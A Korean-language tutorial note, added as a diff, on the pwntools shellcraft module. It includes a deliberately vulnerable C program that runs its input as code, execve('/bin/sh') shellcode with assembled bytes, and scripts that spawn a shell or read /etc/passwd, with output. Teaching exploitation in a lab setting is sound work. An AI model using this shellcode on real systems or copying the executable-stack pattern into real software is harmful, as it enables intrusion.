@@ -1,0 +1,126 @@
+pwntools - shellcraft :
+    shellcraft는 원하는 시스템 콜과 인자를 지정해주면 셸코드를 작성해주는 기능입니다.
+
+    shellcraft.c는 작성한 셸코드를 실행하기 위한 예제입니다.
+    ex)
+        // gcc -o shellcraft shellcraft.c -zexecstack
+        #include <stdio.h>
+        #include <unistd.h>
+        int main() {
+            char shellcode[256];
+            
+            read(0, shellcode, 256);
+            int (*shell)() = (int (*)())shellcode;
+            
+            shell();
+        }
+
+    shellcraft에서 지원하는 시스템 콜은 다음 명령을 통해 확인할 수 있습니다.
+    ex)
+        dir(shellcraft)
+
+    셸을 획득하기 위해서는 execve 시스템 콜을 사용해서 셸코드를 작성해야 합니다.
+    ex)
+        context.arch = 'x86_64'
+        print shellcraft.execve("/bin/sh",0,0)
+            /* execve(path='/bin/sh', argv=0, envp=0) */
+            /* push '/bin/sh\x00' */
+            push 0x1010101
+            xor dword ptr [esp], 0x169722e
+            push 0x6e69622f
+            mov ebx, esp
+            xor ecx, ecx
+            xor edx, edx
+            /* call execve() */
+            push SYS_execve /* 0xb */
+            pop eax
+            int 0x80
+
+    shellcraft.execve("/bin/sh",0,0) 을 사용하면 execve("/bin/sh",0,0)이 실행되는 디스어셈블리 명령어를 출력합니다.
+    이를 셸코드로 변환하기 위해서는 앞서 언급한 asm 함수를 사용해야 합니다.
+    ex)
+        asm(shellcraft.execve("/bin/sh",0,0))
+        'h\x01\x01\x01\x01\x814$.ri\x01h/bin\x89\xe31\xc91\xd2j\x0bX\xcd\x80'
+
+    shellcraft는 스택에 값을 저장하고 레지스터를 인자로 전달하는 셸코드를 작성할 수 있습니다.
+    ex)
+        payload = shellcraft.pushstr("/etc/passwd")
+        payload += shellcraft.open('rsp',0)
+        payload += shellcraft.read('eax','rsp',1000)
+        payload += shellcraft.write(1,'rsp',1000)
+
+    shellcraft1.py는 execve("/bin/sh",0,0)을 실행하는 셸코드를 작성하고 프로그램에 입력하는 코드입니다.
+    ex)
+        # shellcraft1.py
+        from pwn import *
+        
+        context.arch = 'x86_64'
+        
+        p = process("./shellcraft")
+        
+        shellcode1 = shellcraft.execve("/bin/sh",0,0)
+        
+        p.send(asm(shellcode1))
+        p.interactive()
+
+    셸코드가 실행되면서 셸을 획득하였습니다.
+    ex)
+        $ python shellcraft1.py 
+        [+] Starting local process './shellcraft': pid 62084
+        [*] Switching to interactive mode
+        $ id
+        uid=1001(theori) gid=1001(theori) groups=1001(theori)
+
+    shellcraft2.py는 open,read,write를 실행하는 셸코드를 작성하고 프로그램에 입력하는 코드입니다.
+    ex)
+        # shellcraft2.py
+        from pwn import *
+        
+        context.arch = 'x86_64'
+        p = process("./shellcraft")
+        
+        shellcode2 = shellcraft.pushstr("/etc/passwd")
+        shellcode2 += shellcraft.open('rsp',0,0)
+        shellcode2 += shellcraft.read('rax', 'rsp', 60)
+        shellcode2 += shellcraft.write(1, 'rsp', 60)
+        
+        p.send(asm(shellcode2))
+        p.interactive()
+
+    셸코드가 실행되면서 파일을 읽어왔습니다.
+    ex)
+        $ python shellcraft2.py 
+        [+] Starting local process './shellcraft': pid 62461
+        [*] Switching to interactive mode
+        root:x:0:0:root:/root:/bin/bash
+        daemon:x:1:1:daemon:/usr/sbi[*] Got EOF while reading in interactive
+
+    interactive :
+        shellcraft1.py와 shellcraft2.py를 보면 p.interactive() 코드가 존재합니다.
+        interactive 함수는 연결이 맺어진 객체와 상호 작용을 할 수 있도록 하는 함수입니다.
+        예를 들어, shellcraft1.py의 경우 셸코드를 입력하면 execve("/bin/sh",0,0)이 실행되면서 셸을 획득합니다. 
+        이때, interactive 함수를 사용하면 사용자가 직접 명령어를 입력하고 출력된 결과를 확인할 수 있습니다.
+        
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
